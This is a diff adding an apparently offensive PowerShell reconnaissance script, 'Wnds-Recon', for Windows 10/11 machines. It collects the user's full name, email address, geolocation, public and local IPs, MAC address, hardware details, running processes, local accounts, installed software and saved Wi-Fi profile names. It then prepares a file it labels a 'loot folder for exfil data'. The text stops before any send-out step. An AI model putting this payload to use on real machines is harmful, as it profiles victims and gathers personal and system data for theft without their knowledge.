@@ -1,0 +1,156 @@
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+&                                             |                                                                   |             .'''''.        ..||..'''''''...      &
+& -Title     : Wnds-Recon                     |                                                                   |            / ##### \       : ||            ''.   &
+& -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. &
+& -Version   : 1.0                            |                                                                   |           | #  #  # |        ||             '''' &
+& -Category  :Recon/ useful cmds              |       .___  __           .___                                     |            \ ##### /     /| < _>                 &
+& -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                &
+&                                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                &
+&                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  &
+&                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  &                                    \/           \/      \/     \/     \/                                                                          | ####### |     .  ||                 & 
+&                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  & 
+&                                             |                                                                   |         |   |     |  '...''  ||                  &
+&_____________________________________________|___________________________________________________________________|         |  |       |         ||                  &
+&                                                                                                                 |          \ |       |         ||                  & 
+&                                                                                                                 |          |\|       |         ||                  &
+&                                                                                                                 |          \|         |        ||                  &
+&                                                                                                                 |           |         |        ||                  &
+&  -github.com/ibeihoffer                                                                                         |           |         |        ||                  &
+&  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  &
+&                                                                                                                 |        __|           |__     ||                  &
+&                                                                                                                 |       /   '.........'   \    ||                  &
+&                                                                                                                 |        ''''''     ''''''     ##                  &
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                                                                                                              
+
+######################################################################################################################################################################
+#Gets full name of user in Windows env
+
+{
+$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+}
+
+return $fullName
+
+######################################################################################################################################################################
+
+#Gets users associated email address
+
+{
+$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
+}
+	return $email
+  
+######################################################################################################################################################################
+
+#Gets geolocation information - unsucessful testing (NEEDS WORK) - referenced Jakoby
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current location
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+$GL = Get-GeoLocation
+
+######################################################################################################################################################################
+
+#Show wireless networks
+
+netsh wlan show networks mode=Bssid
+
+######################################################################################################################################################################
+
+#SYSTEM INFO
+
+#Pub IP add#
+Invoke-WebRequest ipinfo.io/ip -UseBasicParsing
+
+#Local IP interface(s) info#
+get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+
+#MAC addr#
+$MAC=ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+
+return $MAC
+
+#Computer Sys Info
+Get-CimInstance CIM_ComputerSystem
+
+#BIOS Info
+Get-CimInstance CIM_BIOSElement
+
+#OS Info (reference Jakoby)
+Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
+
+#CPU Info
+Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
+
+#Mobo Info
+Get-WmiObject Win32_BaseBoard | Format-List
+
+#RAM Capacity
+Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+
+######################################################################################################################################################################
+
+#Com/ Serial Devices
+Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
+
+######################################################################################################################################################################
+
+#Network Interfaces
+Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+
+######################################################################################################################################################################
+
+#All WLAN profile names
+netsh.exe wlan show profiles | Select-String -pattern " : "
+
+######################################################################################################################################################################
+
+#Running Processes
+Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
+
+######################################################################################################################################################################
+
+#System Local Users
+Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID
+
+######################################################################################################################################################################
+
+#Installed Software (get uninstaller?) (referenced Jakoby)
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
+
+######################################################################################################################################################################
+
+#All drivers
+Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
+
+######################################################################################################################################################################
+
+#GPU info
+Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
+
+######################################################################################################################################################################
+
+#Loot folder for exfil data
+$FileName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mm tt')_computer_recon.txt"
+
